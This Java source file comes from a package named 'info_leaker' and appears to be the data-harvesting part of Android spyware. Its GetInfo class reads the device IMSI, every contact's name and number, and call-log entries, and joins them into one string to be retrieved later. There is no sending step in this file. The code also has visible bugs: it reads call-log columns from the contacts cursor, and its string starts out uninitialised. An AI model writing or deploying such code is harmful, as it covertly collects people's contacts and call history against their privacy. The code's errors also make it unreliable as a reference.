package com.info_leaker;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Contacts;
import android.provider.CallLog;

@SuppressWarnings("deprecation")
public class GetInfo extends Activity
{
	String m_info;
	String m_IMSI;
	
	public GetInfo(String imsi){
		m_IMSI = imsi;
		Cursor c = getContacts();
		c.moveToFirst();
		m_info += "Contacts---";
		while(!c.isLast())
		{
			m_info += c.getString(c.getColumnIndexOrThrow(Contacts.People.NAME))+
				 c.getString(c.getColumnIndexOrThrow(Contacts.People.NUMBER));
			c.moveToNext();
		}
		Cursor l = getLog();
		l.moveToFirst();
		m_info += "CallLogs---";
		while(!l.isLast())
		{
			m_info += l.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))+
				 l.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
			l.moveToNext();
		}
	}
	public String getIMSI(){
		return m_IMSI;
	}
	public String getInfo(){
		return m_info;
	}

	private Cursor getContacts()
    {
        Uri uri = Contacts.People.CONTENT_URI;
        String[] projection = new String[] {
        		Contacts.People._ID,
        		Contacts.People.NAME,
                Contacts.People.NUMBER
        };
       ContentResolver cr = this.getContentResolver();
       return cr.query(uri, projection, Contacts.People.NUMBER + " is not null", null, Contacts.People.DEFAULT_SORT_ORDER);
    }
	private Cursor getLog()
	{
		Uri uri = CallLog.Calls.CONTENT_URI;
		String[] projection = new String[] {
				CallLog.Calls.TYPE,
				CallLog.Calls.NUMBER
		};
		ContentResolver cr = this.getContentResolver();
		return cr.query(uri, projection, CallLog.Calls.NUMBER + " is not null",null, CallLog.Calls.DEFAULT_SORT_ORDER);
	}
}
